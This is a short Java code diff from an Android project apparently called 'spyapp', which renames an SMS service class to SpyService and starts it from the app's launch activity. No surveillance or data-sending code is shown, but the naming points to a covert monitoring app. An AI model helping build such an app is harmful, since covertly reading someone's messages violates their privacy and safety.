@@ -5,7 +5,7 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
 
-import com.spyapp.android.service.SmsService;
+import com.spyapp.android.service.SpyService;
 
 public class StartActivity extends Activity {
 
@@ -19,7 +19,7 @@ public class StartActivity extends Activity {
     }
 
     private void startSmsService() {
-        Intent serviceIntent = new Intent(getBaseContext(), SmsService.class);
+        Intent serviceIntent = new Intent(getBaseContext(), SpyService.class);
         startService(serviceIntent);
     }
 
